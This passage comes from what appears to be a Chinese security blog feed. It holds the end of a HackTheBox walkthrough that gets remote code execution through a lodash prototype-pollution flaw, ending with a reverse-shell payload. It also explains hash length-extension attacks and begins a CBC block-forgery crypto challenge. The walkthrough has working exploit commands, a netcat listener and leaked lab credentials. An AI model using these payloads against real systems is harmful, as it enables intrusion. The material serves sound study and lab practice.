class="built_in">require</span>(<span class="string">&#x27;../models/User&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; decodejwt &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../functions/jwt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//controllers</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; messages &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/Messages&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; messages_send &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../controllers/Messages_send&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.use(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">async</span>(req,res,next)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.headers[<span class="string">&quot;x-access-token&quot;</span>])&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = decodejwt(req.headers[<span class="string">&quot;x-access-token&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(token)&#123;</span><br><span class="line">            <span class="keyword">const</span> find = <span class="keyword">await</span> User.findAll(&#123;<span class="attr">where</span>: &#123;<span class="attr">username</span>: token.user, <span class="attr">role</span>: token.role&#125;&#125;);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(find.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(find[<span class="number">0</span>].username == token.user &amp;&amp; find[<span class="number">0</span>].role == token.role &amp;&amp; token.role == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> next();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;You are not allowed&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>, <span class="attr">Message</span>: <span class="string">&#x27;Read documentation from api in /documentation&#x27;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/messages&#x27;</span>,messages);</span><br><span class="line">router.post(<span class="string">&#x27;/messages/send&#x27;</span>, messages_send);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>这里会对Token进行校验，Token的用户名和role需要与数据库中的内容匹配且role需要为&quot;admin&quot;</p><p>查看<code>/home/victor/pollution_api/controllers/Messages_send.js</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/controllers/Messages_send.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Message = <span class="built_in">require</span>(<span class="string">&#x27;../models/Message&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; decodejwt &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../functions/jwt&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> messages_send = <span class="keyword">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = decodejwt(req.headers[<span class="string">&#x27;x-access-token&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span>(req.body.text)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> message = &#123;</span><br><span class="line">            user_sent: token.user,</span><br><span class="line">            title: <span class="string">&quot;Message for admins&quot;</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        _.merge(message, req.body);</span><br><span class="line"></span><br><span class="line">        exec(<span class="string">&#x27;/home/victor/pollution_api/log.sh log_message&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        Message.create(&#123;</span><br><span class="line">            text: <span class="built_in">JSON</span>.stringify(message),</span><br><span class="line">            user_sent: token.user</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;Parameter text not found&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; messages_send &#125;;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/qq_61209261/article/details/125821976">https://blog.csdn.net/qq_61209261/article/details/125821976</a></p></blockquote><p>函数<code>merge</code>存在js原型污染漏洞</p><p>注册用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://127.0.0.1:3000/auth/register&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d <span class="string">&#x27;&#123;&quot;username&quot;: &quot;Bufferfly&quot;, &quot;password&quot;: &quot;Bufferfly&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>获取tty，访问Mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u webapp_user -p<span class="string">&#x27;Str0ngP4ssw0rdB*12@1&#x27;</span></span><br></pre></td></tr></table></figure><p>查看用户表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pollution_api.users;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+-----------+-----------+------+---------------------+---------------------+</span><br><span class="line">| id | username  | password  | role | createdAt           | updatedAt           |</span><br><span class="line">+----+-----------+-----------+------+---------------------+---------------------+</span><br><span class="line">|  1 | Bufferfly | Bufferfly | user | 2023-04-01 17:13:24 | 2023-04-01 17:13:24 |</span><br><span class="line">+----+-----------+-----------+------+---------------------+---------------------+</span><br></pre></td></tr></table></figure><p>更改role字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> pollution_api.users <span class="keyword">set</span> role<span class="operator">=</span>&quot;admin&quot; <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pollution_api.users;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+-----------+-----------+-------+---------------------+---------------------+</span><br><span class="line">| id | username  | password  | role  | createdAt           | updatedAt           |</span><br><span class="line">+----+-----------+-----------+-------+---------------------+---------------------+</span><br><span class="line">|  1 | Bufferfly | Bufferfly | admin | 2023-04-01 17:13:24 | 2023-04-01 17:13:24 |</span><br><span class="line">+----+-----------+-----------+-------+---------------------+---------------------+</span><br></pre></td></tr></table></figure><p>登录API，获得Token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:3000/auth/login -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;Bufferfly&quot;,&quot;password&quot;:&quot;Bufferfly&quot;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;Status&quot;</span>:<span class="string">&quot;Ok&quot;</span>,<span class="attr">&quot;Header&quot;</span>:&#123;<span class="attr">&quot;x-access-token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiQnVmZmVyZmx5IiwiaXNfYXV0aCI6dHJ1ZSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgwMzY5NjM5LCJleHAiOjE2ODAzNzMyMzl9.U1kKGgUlgtNnE3_OD3h7n-tB7cBI4FQYv-yixokgxKc&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#pp2rce-via-env-vars-+-cmdline</a></p></blockquote><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><p>触发原型污染漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:3000/admin/messages/send -d <span class="string">&#x27;&#123;&quot;text&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/cmdline&quot;, &quot;argv0&quot;: &quot;console.log(require(\&quot;child_process\&quot;).execSync(\&quot;echo -n $PYTHON_REVERSE_SHELL_PAYLOAD_BASE64_ENCODED | base64 -d | bash\&quot;).toString())//&quot;&#125;&#125;&#125;&#x27;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> -H <span class="string">&quot;x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiQnVmZmVyZmx5IiwiaXNfYXV0aCI6dHJ1ZSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgwMzY5NjM5LCJleHAiOjE2ODAzNzMyMzl9.U1kKGgUlgtNnE3_OD3h7n-tB7cBI4FQYv-yixokgxKc&quot;</span></span><br></pre></td></tr></table></figure><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">748b470c7c0daaf4c5754c19ba32b9f1</span><br></pre></td></tr></table></figure><hr /><p>虽然不太懂js原型污染的漏洞原理，但是跟着hacktricks抄Payload就能打通，以后再看吧</p><p>一个月做了12台靶机带几个题总算是上到Pro Hacker了</p><p>博客文章得整理一下，该好好准备OSCP了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HackTheBox合集&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hash_Extend</title>
    <link href="https://yoloyolo.top/2023/02/21/Hash-Extend/"/>
    <id>https://yoloyolo.top/2023/02/21/Hash-Extend/</id>
    <published>2023-02-20T22:21:17.000Z</published>
    <updated>2023-06-03T03:09:57.209Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><blockquote><p>pip install hashpumpy</p></blockquote><p>MD5, SHA1, SHA256每轮加密块大小为64Byte(512Bits)，其中前56Byte(448Bits)用于存储加密数据，后8Byte(64Bits)用于存储数据Bit位数</p><p>SHA512每轮加密块大小为128Byte(1024Bits)，其中前112Byte(896Bits)用于存储加密数据，后16Byte(128Bits)用于存储数据Bit位数</p><p>MD5存储数据长度时使用小端排序，SHA1, SHA256, SHA512则使用大端排序</p><p>SHA384在使用hashpumpy.pump时会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpumpy.error: unsupported hash size</span><br></pre></td></tr></table></figure><p>以上Hash算法均基于Merkle-Damgård结构，抽象来看，可以类比于对称加密中的OFB模式，即上一轮的加密结果会作为下一轮加密的输入</p><p>以MD5为例</p><p>我们要加密明文admin，此时明文长度小于加密块数据长度，则会被填充<code>\x80\x00\x00\x00...</code></p><p>那么加密块为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p>在完成第一轮加密之后我们会得到这一部分的Hash值，如有后续部分，则这部分Hash将作为输入对后一轮加密进行处理</p><p>假设存在一个认证方式，将以下内容作为Cookie<br />username+signature<br />且signature=MD5(secret+username)<br />且在校验方法为<br />MD5(secret+input_username) == signature</p><p>我们以Alice身份登入后得到这个Cookie，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(secret+&quot;Alice&quot;)</span><br></pre></td></tr></table></figure><p>如果secret长度已知，假设为6</p><p>那么可以得到以下加密块，以及其MD5值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??????Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00</span><br></pre></td></tr></table></figure><p>在加密块后续内容追加内容Bob，则可以将上一部分的MD5作为下一轮加密的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??????Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob</span><br></pre></td></tr></table></figure><p>即可得到这部分的MD5值</p><p>在进行认证时，可以使用以下用户名以及其相应的MD5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&quot;Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob&quot;</span><br></pre></td></tr></table></figure><p>服务器在验证身份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(secert+&quot;Alice\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00Bob&quot;) &#x3D;&#x3D; signature</span><br></pre></td></tr></table></figure><p>即完成了哈希扩展攻击，如果服务器对用户名的验证存在不安全的逻辑，那么就有可能越权漏洞</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="Hash" scheme="https://yoloyolo.top/tags/Hash/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Flippin_Bank</title>
    <link href="https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/"/>
    <id>https://yoloyolo.top/2023/02/20/HackTheBox-Flippin-Bank/</id>
    <published>2023-02-19T21:33:53.000Z</published>
    <updated>2023-07-18T17:14:27.431Z</updated>
    
    <content type="html"><![CDATA[<p>Dramatically solved.</p><a id="more"></a><h1 id="hackthebox_flippin_bank"><a class="markdownIt-Anchor" href="#hackthebox_flippin_bank"></a> HackTheBox_Flippin_Bank</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketserver </span><br><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad,unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wlcm_msg =<span class="string">&#x27;########################################################################\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#                  Welcome to the Bank of the World                    #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#             All connections are monitored and recorded               #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;#      Disconnect IMMEDIATELY if you are not an authorized user!       #\n&#x27;</span>+\</span><br><span class="line">          <span class="string">&#x27;########################################################################\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">iv = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_data</span>(<span class="params">data</span>):</span></span><br><span class="line">    padded = pad(data.encode(),<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">    enc = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> enc.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_data</span>(<span class="params">encryptedParams</span>):</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">    paddedParams = cipher.decrypt( unhexlify(encryptedParams))</span><br><span class="line">    print(paddedParams)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;admin&amp;password=g0ld3n_b0y&#x27;</span> <span class="keyword">in</span> unpad(paddedParams,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">s, msg</span>):</span></span><br><span class="line">    enc = msg.encode()</span><br><span class="line">    s.send(enc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">s</span>):</span></span><br><span class="line">    send_msg(s, <span class="string">&#x27;username: &#x27;</span>)</span><br><span class="line">    user = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line"></span><br><span class="line">    send_msg(s, user +<span class="string">&quot;&#x27;s password: &quot;</span> )</span><br><span class="line">    passwd = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">    </span><br><span class="line">    send_msg(s, wlcm_msg)</span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&#x27;logged_username=&#x27;</span> + user +<span class="string">&#x27;&amp;password=&#x27;</span> + passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span>(<span class="string">&#x27;admin&amp;password=g0ld3n_b0y&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> msg)</span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;You cannot login as an admin from an external IP.\nYour activity has been logged. Goodbye!\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&#x27;logged_username=&#x27;</span> + user +<span class="string">&#x27;&amp;password=&#x27;</span> + passwd</span><br><span class="line">    send_msg(s, <span class="string">&quot;Leaked ciphertext: &quot;</span> + encrypt_data(msg)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    send_msg(s,<span class="string">&quot;enter ciphertext: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    enc_msg = s.recv(<span class="number">4096</span>).decode().strip()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        check = decrypt_data(enc_msg)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        send_msg(s, <span class="built_in">str</span>(e) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;Logged in successfully!\nYour flag is: &#x27;</span>+ FLAG)</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send_msg(s, <span class="string">&#x27;Please try again.&#x27;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskHandler</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        main(self.request)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    socketserver.ThreadingTCPServer.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>), TaskHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><h2 id="cbc字节翻转"><a class="markdownIt-Anchor" href="#cbc字节翻转"></a> CBC字节翻转？</h2><p>一眼CBC字节翻转</p><p>看一半发现IV不可控</p><h2 id="cbc密码块构造"><a class="markdownIt-Anchor" href="#cbc密码块构造"></a> CBC密码块构造</h2><p>想了一下可以构造伪密码块</p><p>CBC大概加解密流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plain_Block -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Block_Cipher_Encrypt -&gt; Cipher_Block -&gt; Block_Cipher_Decrypt -&gt; Xor(Last_Cipher_Block&#x2F;IV) -&gt; Plain_Block</span><br></pre></td></tr></table></figure><p>题目中的所需密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Plain_Block_1       Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    admin&amp;password&#x3D;g    0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Cipher_Block_1      Cipher_Block_2</span><br></pre></td></tr></table></figure><p><code>Key</code>, <code>IV</code>, <code>Plain_Block_0</code>固定，则<code>Cipher_Block_0</code>固定</p><p>攻击思路如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = Plain_Block_1 ^ Cipher_Block_0</span><br><span class="line">Cipher_Block_1 = encrypt(target)</span><br><span class="line">Cipher_Block_2 = encrypt(Plain_Block_2 ^ Cipher_Block_1)</span><br></pre></td></tr></table></figure><p>我们可以在<code>Plain_Block_1</code>与<code>Plain_Block_2</code>中间插入<code>Plain_Block_Payload</code><br />并且满足以下条件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload = encrypt(Plain_Block_Payload ^ Cipher_Block_1)</span><br><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br></pre></td></tr></table></figure><p>在这种情况下则有</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br><span class="line">Cipher_Block_Payload ^ Plain_Block_2 == Cipher_Block_1 ^ Plain_Block_2</span><br><span class="line">encrypt(Cipher_Block_Payload ^ Plain_Block_2) == encrypt(Cipher_Block_1 ^ Plain_Block_2) == Cipher_Block_2</span><br></pre></td></tr></table></figure><p>即我们可以获得Get Flag情况下<code>Cipher_Block_2</code>的内容</p><p>但是<code>Plain_Block_Payload</code>该如何构造？</p><h2 id="payload明文密码块构造"><a class="markdownIt-Anchor" href="#payload明文密码块构造"></a> Payload明文密码块构造</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 